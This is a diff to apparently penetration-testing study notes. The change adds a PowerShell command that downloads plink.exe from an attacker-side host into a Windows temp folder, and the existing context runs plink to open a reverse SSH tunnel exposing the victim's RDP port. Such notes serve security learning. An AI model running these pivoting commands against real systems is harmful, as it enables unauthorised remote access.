@@ -77,6 +77,10 @@ then we copy plink over to windows
 
     $ cp /usr/share/windows-resources/binaries/plink.exe .
 
+if no gui an shell only
+
+    C:> powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+
 once plink is copied over
 
     $ C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.1.1
